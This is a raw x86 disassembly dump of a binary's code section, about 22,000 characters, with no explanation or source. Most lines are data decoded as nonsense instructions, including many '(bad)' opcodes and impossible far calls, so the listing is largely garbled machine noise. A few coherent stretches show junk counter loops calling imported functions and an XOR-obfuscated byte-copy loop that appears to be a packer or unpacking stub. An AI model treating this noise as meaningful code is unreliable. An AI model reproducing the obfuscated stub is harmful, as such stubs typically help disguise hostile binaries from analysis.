  40f2e9:	add    eax,0x95e6994e
  40f2ee:	int3   
  40f2ef:	call   0xfaad:0xd1e4ab13
  40f2f6:	cdq    
  40f2f7:	and    ecx,DWORD PTR [ebp+0xc281041]
  40f2fd:	sub    al,0xc3
  40f2ff:	js     0x40f2b9
  40f301:	(bad)  
  40f302:	into   
  40f303:	inc    ecx
  40f304:	iret   
  40f305:	xchg   ebp,eax
  40f306:	fadd   st(6),st
  40f308:	or     ecx,0x1b
  40f30b:	mov    bh,BYTE PTR [ebp+0xb]
  40f30e:	xchg   edx,eax
  40f30f:	adc    DWORD PTR [ebx],esp
  40f311:	and    eax,0x57c0bf07
  40f316:	push   edi
  40f317:	or     BYTE PTR [eax+0x1c],ah
  40f31a:	je     0x40f358
  40f31c:	pop    esp
  40f31d:	enter  0xcdbe,0x9c
  40f321:	mov    eax,0xc530a05b
  40f326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f327:	gs jg  0x40f365
  40f32a:	push   ss
  40f32b:	pop    eax
  40f32c:	arpl   di,bx
  40f32e:	xchg   DWORD PTR [edi+0x300ab407],eax
  40f334:	sbb    al,0x94
  40f336:	fdivr  DWORD PTR [edx-0x6666bbe9]
  40f33c:	xor    eax,0x5c2ec785
  40f341:	rol    eax,1
  40f343:	data16 and cl,BYTE PTR [esi]
  40f346:	xchg   esp,eax
  40f347:	push   edi
  40f348:	cmp    BYTE PTR [ebp+0x2a],bl
  40f34b:	dec    edi
  40f34c:	mov    esi,0x88bb235f
  40f351:	or     ebx,DWORD PTR ds:0x1e8306c5
  40f357:	ds inc esi
  40f359:	add    eax,0xb433a30e
  40f35e:	jns    0x40f32c
  40f360:	fild   QWORD PTR [ecx+0x2e153c1c]
  40f366:	lods   eax,DWORD PTR ds:[esi]
  40f367:	cli    
  40f368:	aam    0x69
  40f36a:	push   esp
  40f36b:	ret    0x7b38
  40f36e:	(bad)  
  40f36f:	(bad)  
  40f370:	stc    
  40f371:	fistp  QWORD PTR [ebx+ebx*1]
  40f374:	cmp    BYTE PTR [esi+0x4a8bdba5],cl
  40f37a:	imul   edi,DWORD PTR [edi],0x950a668a
  40f380:	pop    esp
  40f381:	push   ds
  40f382:	mov    eax,0xf89c8531
  40f387:	and    DWORD PTR ds:0x4337a7,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4337a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4337a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4337a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4337a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4337a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4336ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433783
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4336d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4336d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4336d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4336d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4336d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43376f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43376f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43376f,ecx
  40f444:	cmp    DWORD PTR ds:0x43376f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43376f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43376f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43376f,ecx
  40f474:	cmp    DWORD PTR ds:0x43376f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43375b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43375b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43375b,edx
  40f498:	cmp    DWORD PTR ds:0x43375b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433911
  40f4af:	push   0x433967
  40f4b4:	push   0x43394b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43375b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433797
  40f4d2:	adc    DWORD PTR ds:0x4337a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x45e87439]
  40f540:	icebp  
  40f541:	aam    0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	mov    ah,BYTE PTR [ebx]
  40f54b:	jae    0x40f56f
  40f54d:	lahf   
  40f54e:	std    
  40f54f:	xor    DWORD PTR [ecx+ebp*1+0x9],0xa603e74
  40f557:	es mov edx,ebx
  40f55a:	scas   eax,DWORD PTR es:[edi]
  40f55b:	jge    0x40f57e
  40f55d:	out    0xe7,al
  40f55f:	or     DWORD PTR [ecx],0x6b5f5a4d
  40f565:	clc    
  40f566:	retf   
  40f567:	shl    esp,1
  40f569:	xchg   ecx,eax
  40f56a:	or     DWORD PTR [ecx+0x2],esp
  40f56d:	sar    esi,1
  40f56f:	adc    dh,BYTE PTR [ecx-0x45e807f1]
  40f575:	push   ebp
  40f576:	test   eax,0xef2e694a
  40f57b:	inc    esi
  40f57c:	out    dx,eax
  40f57d:	mov    edx,0xb3056b73
  40f582:	mov    WORD PTR [eax+0x4b],?
  40f585:	add    edx,edi
  40f587:	push   0xbadcd889
  40f58c:	popf   
  40f58d:	sub    al,0x82
  40f58f:	aam    0x98
  40f591:	xchg   esi,eax
  40f592:	pop    es
  40f593:	hlt    
  40f594:	fsubr  DWORD PTR [ebp+0x4a]
  40f597:	xchg   ebp,eax
  40f598:	rcl    BYTE PTR [eax],1
  40f59a:	xor    BYTE PTR [edi],al
  40f59c:	iret   
  40f59d:	popf   
  40f59e:	mov    ebx,DWORD PTR ds:0xe5bbde92
  40f5a4:	cmp    BYTE PTR [ecx+0x7],dl
  40f5a7:	fs retf 0xab7c
  40f5ab:	jae    0x40f53b
  40f5ad:	mov    dl,0x41
  40f5af:	jbe    0x40f588
  40f5b1:	sbb    BYTE PTR ds:0xc44e53ed,al
  40f5b7:	test   DWORD PTR [eax-0x2c],0x350c8756
  40f5be:	mov    edx,0xae22ad20
  40f5c3:	cmc    
  40f5c4:	xor    ah,BYTE PTR [ebx+0x4e]
  40f5c7:	leave  
  40f5c8:	mov    ecx,0xdeb6ffcd
  40f5cd:	mov    bh,0xa5
  40f5cf:	scas   eax,DWORD PTR es:[edi]
  40f5d0:	jns    0x40f60e
  40f5d2:	sub    esi,esi
  40f5d4:	pop    ecx
  40f5d5:	xor    eax,0x713263bd
  40f5da:	outs   dx,BYTE PTR ds:[esi]
  40f5db:	fnstsw WORD PTR [eax-0x26]
  40f5de:	sub    BYTE PTR ds:[edx],dl
  40f5e1:	lahf   
  40f5e2:	adc    BYTE PTR [ecx],al
  40f5e4:	hlt    
  40f5e5:	inc    eax
  40f5e6:	(bad)  [edx*8-0x5ed79581]
  40f5ed:	add    cl,BYTE PTR [eax+0x7a]
  40f5f0:	ins    DWORD PTR es:[edi],dx
  40f5f1:	jne    0x40f5d5
  40f5f3:	mov    eax,0x6468157d
  40f5f8:	nop
  40f5f9:	lds    edx,FWORD PTR [esi-0x1]
  40f5fc:	scas   al,BYTE PTR es:[edi]
  40f5fd:	cmp    DWORD PTR [ebp+0x3b9b50a2],ebx
  40f603:	ret    
  40f604:	mov    ch,0xb0
  40f606:	and    bl,BYTE PTR [edx+0x2b]
  40f609:	pop    edi
  40f60a:	adc    BYTE PTR [ecx-0x25],cl
  40f60d:	xor    DWORD PTR [ebp+0x25],esi
  40f610:	sbb    DWORD PTR [ebx-0x6e6e46e9],edi
  40f616:	in     eax,0x6e
  40f618:	and    BYTE PTR [esi+0x53],bl
  40f61b:	push   edx
  40f61c:	jp     0x40f62c
  40f61e:	ds clc 
  40f620:	jle    0x40f667
  40f622:	fwait
  40f623:	lds    ebx,FWORD PTR [ecx+edx*2]
  40f626:	arpl   WORD PTR [edi-0x57],ax
  40f629:	inc    eax
  40f62a:	inc    esp
  40f62b:	mov    al,0xaf
  40f62d:	scas   al,BYTE PTR es:[edi]
  40f62e:	jmp    0x4497:0x9acf29aa
  40f635:	std    
  40f636:	in     al,0x6d
  40f638:	aam    0x23
  40f63a:	aad    0x26
  40f63c:	rcl    BYTE PTR ds:[eax],1
  40f63f:	jae    0x40f68f
  40f641:	pusha  
  40f642:	bound  ecx,QWORD PTR [ebp-0x3d81a5ae]
  40f648:	bound  esp,QWORD PTR [edi]
  40f64a:	push   ecx
  40f64b:	loop   0x40f692
  40f64d:	push   ss
  40f64e:	adc    eax,0xf1e27d3e
  40f653:	inc    ebp
  40f654:	xlat   BYTE PTR ds:[ebx]
  40f655:	cmc    
  40f656:	lods   eax,DWORD PTR ds:[esi]
  40f657:	jge    0x40f61e
  40f659:	mov    BYTE PTR [ebx+edi*2-0x65d752ac],dl
  40f660:	xor    esp,ebx
  40f662:	mov    esp,0x23ab2acc
  40f667:	aaa    
  40f668:	dec    edx
  40f669:	aad    0x10
  40f66b:	add    ch,dh
  40f66d:	outs   dx,BYTE PTR ds:[esi]
  40f66e:	xchg   ebp,eax
  40f66f:	aas    
  40f670:	retf   0x4f31
  40f673:	dec    eax
  40f674:	push   edi
  40f675:	fsubr  st(7),st
  40f677:	add    eax,0x18066c7b
  40f67c:	ins    DWORD PTR es:[edi],dx
  40f67d:	pusha  
  40f67e:	rcr    ebx,cl
  40f680:	jae    0x40f6e4
  40f682:	ret    0x33c7
  40f685:	ins    DWORD PTR es:[edi],dx
  40f686:	cdq    
  40f687:	ins    DWORD PTR es:[edi],dx
  40f688:	paddd  mm1,mm3
  40f68b:	mov    edx,0x358b3b58
  40f690:	jmp    0x40f621
  40f692:	or     eax,0x16719a4e
  40f697:	jp     0x40f701
  40f699:	test   eax,ecx
  40f69b:	retf   0x8477
  40f69e:	sub    eax,0xa6973fe
  40f6a3:	ja     0x40f682
  40f6a5:	lods   eax,DWORD PTR ds:[esi]
  40f6a6:	push   0x27a97227
  40f6ab:	stos   DWORD PTR es:[edi],eax
  40f6ac:	das    
  40f6ad:	ja     0x40f675
  40f6af:	push   es
  40f6b0:	sahf   
  40f6b1:	xchg   edi,eax
  40f6b2:	lods   eax,DWORD PTR ds:[esi]
  40f6b3:	test   DWORD PTR [bp-0x6851],edi
  40f6b8:	push   cs
  40f6b9:	mov    eax,0x9ae13eee
  40f6be:	test   dl,dl
  40f6c0:	add    DWORD PTR [ecx-0x3f],0x707e15e8
  40f6c7:	js     0x40f689
  40f6c9:	ss aas 
  40f6cb:	nop
  40f6cc:	es (bad) 
  40f6ce:	(bad)  
  40f6cf:	fnstenv [ecx+esi*8-0x7b]
  40f6d3:	leave  
  40f6d4:	adc    bh,bl
  40f6d6:	lahf   
  40f6d7:	jl     0x40f6b3
  40f6d9:	and    DWORD PTR [edx],edi
  40f6db:	ret    0xfad2
  40f6de:	fdivr  DWORD PTR cs:[edx+eiz*8-0x2f]
  40f6e3:	inc    ebp
  40f6e4:	sar    DWORD PTR [ebx],1
  40f6e6:	lods   al,BYTE PTR ds:[esi]
  40f6e7:	adc    al,0x17
  40f6e9:	stos   DWORD PTR es:[edi],eax
  40f6ea:	pop    esp
  40f6eb:	call   0x5a6:0x10081685
  40f6f2:	inc    ebx
  40f6f3:	iret   
  40f6f4:	lahf   
  40f6f5:	jns    0x40f747
  40f6f7:	aaa    
  40f6f8:	sub    ah,BYTE PTR [edx+eax*4]
  40f6fb:	xchg   ebx,eax
  40f6fc:	in     eax,dx
  40f6fd:	and    eax,0x48bbd9a5
  40f702:	aam    0xc7
  40f704:	popf   
  40f705:	cmp    al,0x15
  40f707:	or     ebx,DWORD PTR [edx]
  40f709:	cmp    dh,ah
  40f70b:	jp     0x40f773
  40f70d:	fsubr  st,st(1)
  40f70f:	add    al,0xf7
  40f711:	push   ecx
  40f712:	dec    edi
  40f713:	add    ebx,edx
  40f715:	push   cs
  40f716:	stos   BYTE PTR es:[edi],al
  40f717:	sti    
  40f718:	(bad)  [ecx-0x4d]
  40f71b:	jo     0x40f731
  40f71d:	pop    edx
  40f71e:	sub    DWORD PTR fs:[bp+di+0x6e],eax
  40f723:	xor    esp,0x26c3d022
  40f729:	call   0xbd0c:0x2849ebc4
  40f730:	and    al,0x3
  40f732:	scas   al,BYTE PTR es:[edi]
  40f733:	and    BYTE PTR [ebx-0x5a],dh
  40f736:	pop    eax
  40f737:	mov    dl,0x53
  40f739:	outs   dx,DWORD PTR ds:[esi]
  40f73a:	xchg   DWORD PTR [ecx-0xb2cb105],edi
  40f740:	inc    edx
  40f741:	mulps  xmm6,xmm6
  40f744:	mov    dl,BYTE PTR [edi-0x1d5bd86b]
  40f74a:	addr16 out 0xbc,al
  40f74d:	inc    edi
  40f74e:	call   0x5dfe:0xd22ecce8
  40f755:	test   al,0x97
  40f757:	inc    esp
  40f758:	or     esp,0x3
  40f75b:	daa    
  40f75c:	ds inc eax
  40f75e:	xor    eax,0x30d987a5
  40f763:	cmp    al,0x45
  40f765:	mov    edx,0x8690edab
  40f76a:	scas   al,BYTE PTR es:[edi]
  40f76b:	nop
  40f76c:	adc    eax,0x3737bd8f
  40f771:	jae    0x40f716
  40f773:	or     al,0x7e
  40f775:	aaa    
  40f776:	jg     0x40f736
  40f778:	fidivr WORD PTR [ecx-0x31]
  40f77b:	out    0x56,eax
  40f77d:	sbb    al,0x9f
  40f77f:	xor    eax,0xa4d9369f
  40f784:	in     al,dx
  40f785:	jo     0x40f76c
  40f787:	in     al,0xed
  40f789:	popf   
  40f78a:	out    0x21,al
  40f78c:	into   
  40f78d:	jmp    0x2c1c:0x1ce6cdd2
  40f794:	sbb    bh,cl
  40f796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f797:	cmp    ah,BYTE PTR [eax]
  40f799:	add    eax,0x6aa419d9
  40f79e:	cdq    
  40f79f:	adc    BYTE PTR [ebp-0xea25761],bl
  40f7a5:	jmp    0xa4fe:0x4255c9a1
  40f7ac:	add    edi,DWORD PTR [ecx+0x5b4814ed]
  40f7b2:	cli    
  40f7b3:	cmp    eax,0x29ec5bd
  40f7b8:	clc    
  40f7b9:	cdq    
  40f7ba:	inc    ebx
  40f7bb:	xor    ch,BYTE PTR [eax]
  40f7bd:	sub    eax,0x64e3a53b
  40f7c2:	lea    edi,[esi+0x460f91e3]
  40f7c8:	mov    BYTE PTR [ecx*8-0x201fa31a],bl
  40f7cf:	dec    ecx
  40f7d0:	fdiv   DWORD PTR [ebx-0x51]
  40f7d3:	push   0x715e02ce
  40f7d8:	xchg   ebp,eax
  40f7d9:	pop    edi
  40f7da:	or     ecx,DWORD PTR [edx]
  40f7dc:	call   0xc663:0x8d9e32d7
  40f7e3:	lods   eax,DWORD PTR ds:[esi]
  40f7e4:	sub    esi,edi
  40f7e6:	inc    edx
  40f7e7:	outs   dx,DWORD PTR ds:[esi]
  40f7e8:	xchg   BYTE PTR [ebx+eax*4],dh
  40f7eb:	jp     0x40f850
  40f7ed:	std    
  40f7ee:	inc    ebp
  40f7ef:	fs xchg edi,eax
  40f7f1:	call   0x2dff5844
  40f7f6:	jmp    0x40f804
  40f7f8:	sub    eax,0xa0c9d888
  40f7fd:	lods   al,BYTE PTR ds:[esi]
  40f7fe:	dec    eax
  40f7ff:	out    0x17,al
  40f801:	mov    esi,0xe94bc280
  40f806:	inc    ebp
  40f807:	push   ebx
  40f808:	jo     0x40f83d
  40f80a:	sub    eax,0x6c
  40f80d:	xor    ecx,esi
  40f80f:	aas    
  40f810:	jnp    0x40f838
  40f812:	sahf   
  40f813:	(bad)
  40f817:	sti    
  40f818:	sbb    al,0x29
  40f81a:	fisub  WORD PTR [ebx+0x26bf5296]
  40f820:	(bad)  
  40f821:	icebp  
  40f822:	xor    al,0x83
  40f824:	adc    edx,0xa53f083f
  40f82a:	std    
  40f82b:	fsub   DWORD PTR [ebp-0x27]
  40f82e:	or     al,0xf1
  40f830:	cmc    
  40f831:	stos   BYTE PTR es:[edi],al
  40f832:	inc    ebx
  40f833:	sbb    cl,BYTE PTR [edx+0x4dda1dc4]
  40f839:	loop   0x40f858
  40f83b:	sbb    bh,BYTE PTR [ebx-0x16]
  40f83e:	outs   dx,DWORD PTR ds:[esi]
  40f83f:	in     eax,0x1c
  40f841:	fadd   st,st(2)
  40f843:	xor    al,BYTE PTR [esp+ecx*8]
  40f846:	cwde   
  40f847:	popf   
  40f848:	scas   al,BYTE PTR es:[edi]
  40f849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f84a:	xchg   esi,eax
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x52959a3f
  40f897:	mov    edi,0x7e7eabd2
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	outs   dx,BYTE PTR ds:[esi]
  40f8a1:	dec    edx
  40f8a2:	or     eax,0x1489d250
  40f8a7:	or     DWORD PTR [eax+0x27c32c8],ecx
  40f8ad:	in     eax,0x43
  40f8af:	outs   dx,DWORD PTR ds:[esi]
  40f8b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b1:	xor    BYTE PTR [esi],cl
  40f8b3:	pushf  
  40f8b4:	push   eax
  40f8b5:	ret    
  40f8b6:	adc    ch,bl
  40f8b8:	push   ds
  40f8b9:	adc    BYTE PTR [eax-0x72],cl
  40f8bc:	cmp    BYTE PTR [edx],al
  40f8be:	loop   0x40f8a9
  40f8c0:	cmp    eax,0x5c88f086
  40f8c5:	pusha  
  40f8c6:	lods   al,BYTE PTR ds:[esi]
  40f8c7:	rcl    BYTE PTR [eax+ebp*2-0x73757db8],0x81
  40f8cf:	loope  0x40f85b
  40f8d1:	outs   dx,DWORD PTR ds:[esi]
  40f8d2:	imul   edx,DWORD PTR [ebx],0xdd135809
  40f8d8:	pop    edi
  40f8d9:	sbb    DWORD PTR [ebx-0x3d1018d6],eax
  40f8df:	inc    edx
  40f8e0:	adc    al,0x64
  40f8e2:	ret    0x81bd
  40f8e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8e6:	push   ss
  40f8e7:	ss aaa 
  40f8e9:	add    al,0x9c
  40f8eb:	mov    al,ds:0xb02ebd88
  40f8f0:	or     edx,ebx
  40f8f2:	dec    esp
  40f8f3:	cmp    eax,0x6e348030
  40f8f8:	push   esp
  40f8f9:	xlat   BYTE PTR ds:[ebx]
  40f8fa:	test   dl,ah
  40f8fc:	cmp    BYTE PTR [ebx-0x4f],bl
  40f8ff:	loope  0x40f8c0
  40f901:	inc    ebx
  40f902:	xor    al,0xd0
  40f904:	pop    edx
  40f905:	inc    esi
  40f906:	pop    edx
  40f907:	sub    eax,eax
  40f909:	packuswb mm0,QWORD PTR ds:0x43bfe39b
  40f910:	fstp   st(2)
  40f912:	pop    eax
  40f913:	pop    edx
  40f914:	ja     0x40f95c
  40f916:	aaa    
  40f917:	push   ebp
  40f918:	jo     0x40f91b
  40f91a:	inc    eax
  40f91b:	push   ebx
  40f91c:	push   ecx
  40f91d:	mov    edx,0x6ef5a274
  40f922:	mov    bh,0x81
  40f924:	loope  0x40f9a3
  40f926:	outs   dx,DWORD PTR ds:[esi]
  40f927:	daa    
  40f928:	loop   0x40f97f
  40f92a:	mov    bh,0x48
  40f92c:	and    BYTE PTR [ebp+0x7b733a64],0x96
  40f933:	pushf  
  40f934:	push   ebp
  40f935:	call   0xee3d:0xafc93bb6
  40f93c:	(bad)  ds:0x6e681909
  40f942:	push   ds
  40f943:	mov    cl,bh
  40f945:	add    BYTE PTR [edx+0x7e5c2fa8],ch
  40f94b:	mov    dh,0x8d
  40f94d:	scas   al,BYTE PTR es:[edi]
  40f94e:	imul   esi,DWORD PTR [edx-0x71],0x2dd7e87f
  40f955:	pop    eax
  40f956:	test   DWORD PTR [edx+0x35],ebx
  40f959:	fst    QWORD PTR [ebx+0x28]
  40f95c:	mov    cl,0xdc
  40f95e:	lea    ebx,[ebx]
  40f960:	lock int3 
  40f962:	mov    eax,fs:0xd4e0b681
  40f968:	rcr    ecx,cl
  40f96a:	dec    ebp
  40f96b:	xor    al,BYTE PTR [eax]
  40f96d:	or     al,0xe5
  40f96f:	jmp    0x40f8fb
  40f971:	popf   
  40f972:	pop    ss
  40f973:	ins    DWORD PTR es:[edi],dx
  40f974:	sbb    dl,BYTE PTR [ebx]
  40f976:	daa    
  40f977:	xchg   ebp,eax
  40f978:	sub    al,0x70
  40f97a:	out    0xb1,eax
  40f97c:	sub    DWORD PTR [ecx+0x6eb7f620],esp
  40f982:	dec    ebp
  40f983:	and    cl,dh
  40f985:	inc    esp
  40f986:	mov    ds:0xe23ecba6,al
  40f98b:	iret   
  40f98c:	iret   
  40f98d:	dec    ecx
  40f98e:	aaa    
  40f98f:	sar    esi,0xcd
  40f992:	jg     0x40f9ad
  40f994:	in     eax,dx
  40f995:	sub    eax,0x625aceab
  40f99a:	pop    ebp
  40f99b:	lea    esp,[edi+0x68bfd9f7]
  40f9a1:	sar    DWORD PTR [esi+0x63],cl
  40f9a4:	mov    ebx,0x8099d58d
  40f9a9:	add    eax,0xf8436de9
  40f9ae:	jge    0x40fa00
  40f9b0:	(bad)  
  40f9b1:	sbb    DWORD PTR [eax-0x29],edi
  40f9b4:	xor    ebx,DWORD PTR [esi+0x56ef62fc]
  40f9ba:	xor    DWORD PTR cs:[eax+0x75],ecx
  40f9be:	ror    ah,1
  40f9c0:	nop
  40f9c1:	dec    eax
  40f9c2:	cld    
  40f9c3:	bound  ecx,QWORD PTR [ecx+0x7174684]
  40f9c9:	add    DWORD PTR [edi],esi
  40f9cb:	daa    
  40f9cc:	jb     0x40fa09
  40f9ce:	adc    ebx,DWORD PTR [ebx]
  40f9d0:	mov    bl,0x74
  40f9d2:	xchg   esi,eax
  40f9d3:	and    eax,ebp
  40f9d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d6:	sbb    ebx,ebp
  40f9d8:	cmp    dl,ah
  40f9da:	addr16 clc 
  40f9dc:	cwde   
  40f9dd:	mov    al,0xc5
  40f9df:	lds    ebp,FWORD PTR [ebx-0x3c]
  40f9e2:	dec    esi
  40f9e3:	mov    bl,0xf
  40f9e5:	push   es
  40f9e6:	xchg   eax,eax
  40f9e8:	dec    ecx
  40f9e9:	sbb    dl,BYTE PTR [ecx]
  40f9eb:	pop    eax
  40f9ec:	add    al,0x3d
  40f9ee:	push   esi
  40f9ef:	out    0x4b,eax
  40f9f1:	push   ss
  40f9f2:	sub    al,0x30
  40f9f4:	imul   esi,ebp,0x2a8501ba
  40f9fa:	popa   
  40f9fb:	push   ss
  40f9fc:	int3   
  40f9fd:	push   edi
  40f9fe:	xchg   DWORD PTR [ebx+0x28],ebp
  40fa01:	add    BYTE PTR [ebx+0x2b],ah
  40fa04:	adc    esp,DWORD PTR [edx-0x27]
  40fa07:	icebp  
  40fa08:	xchg   ebx,eax
  40fa09:	aam    0x2
  40fa0b:	lods   eax,DWORD PTR ds:[esi]
  40fa0c:	push   cs
  40fa0d:	or     esi,DWORD PTR [eax-0x5d28a646]
  40fa13:	cli    
  40fa14:	shl    BYTE PTR [edi],cl
  40fa16:	dec    ebp
  40fa17:	in     eax,dx
  40fa18:	ret    0x93ea
  40fa1b:	jg     0x40fa7a
  40fa1d:	xchg   ebp,eax
  40fa1e:	inc    ecx
  40fa1f:	mov    al,0x6c
  40fa21:	mov    esi,0x55396ee
  40fa26:	pop    eax
  40fa27:	sub    eax,esi
  40fa29:	mov    ch,0x60
  40fa2b:	fadd   DWORD PTR [ebx+0x7]
  40fa2e:	daa    
  40fa2f:	push   ds
  40fa30:	ja     0x40f9d2
  40fa32:	mov    al,ds:0x772867b2
  40fa37:	jmp    0xd434:0x350eacad
  40fa3e:	dec    esp
  40fa3f:	popf   
  40fa40:	movzx  eax,BYTE PTR [ebx]
  40fa43:	pop    ecx
  40fa44:	(bad)  
  40fa46:	mov    dl,BYTE PTR [edi]
  40fa48:	int3   
  40fa49:	push   ecx
  40fa4a:	das    
  40fa4b:	jmp    0x583e50e3
  40fa50:	test   BYTE PTR [ebp-0x6f34d701],ch
  40fa56:	das    
  40fa57:	adc    BYTE PTR ds:0x7597af91,dl
  40fa5d:	leave  
  40fa5e:	test   BYTE PTR [eax-0x2e],ch
  40fa61:	cmp    eax,0x2c3904ff
  40fa66:	idiv   BYTE PTR [ebx]
  40fa68:	pop    edi
  40fa69:	jno    0x40fae7
  40fa6b:	push   ds
  40fa6c:	in     eax,0x9f
  40fa6e:	jge    0x40fa13
  40fa70:	add    bl,BYTE PTR [edx-0x2eb82bcf]
  40fa76:	addr16 and eax,0x11128dee
  40fa7c:	dec    eax
  40fa7d:	dec    edi
  40fa7e:	outs   dx,DWORD PTR ds:[esi]
  40fa7f:	or     BYTE PTR [edx-0x7e2ceff9],ch
  40fa85:	or     dl,BYTE PTR [ebx+0x21]
  40fa88:	aas    
  40fa89:	fmul   DWORD PTR [eax+0x54]
  40fa8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa8d:	add    bl,BYTE PTR [eax+edi*4+0x5c]
  40fa91:	stc    
  40fa92:	ds cli 
  40fa94:	sbb    al,0x8d
  40fa96:	jnp    0x40fae2
  40fa98:	les    ebx,FWORD PTR [edi+0x10]
  40fa9b:	mov    dl,0x73
  40fa9d:	out    0xf7,eax
  40fa9f:	add    edx,DWORD PTR [edi]
  40faa1:	and    edi,DWORD PTR [edi]
  40faa3:	lahf   
  40faa4:	adc    bl,BYTE PTR [ecx]
  40faa6:	and    cl,BYTE PTR [edi+eax*2]
  40faa9:	dec    eax
  40faaa:	mov    bh,0x13
  40faac:	xchg   esp,eax
  40faad:	arpl   WORD PTR [ecx],bp
  40faaf:	nop
  40fab0:	scas   al,BYTE PTR es:[edi]
  40fab1:	in     eax,0x77
  40fab3:	mov    ebp,0x2504545d
  40fab8:	test   eax,0x6a1be217
  40fabd:	rcr    BYTE PTR [eax+eiz*2+0x19de7a58],cl
  40fac4:	test   eax,0xb716cf9f
  40fac9:	pop    ss
  40faca:	test   BYTE PTR [ebx+0x12],cl
  40facd:	pop    eax
  40face:	mov    DWORD PTR [edi+0x16e222ec],ecx
  40fad4:	push   edi
  40fad5:	hlt    
  40fad6:	mov    eax,0x2a82f08a
  40fadb:	(bad)  
  40fadc:	aaa    
  40fadd:	jecxz  0x40fb52
  40fadf:	pushf  
  40fae0:	push   eax
  40fae1:	(bad)  
  40fae2:	test   DWORD PTR [ebx],0x596f242f
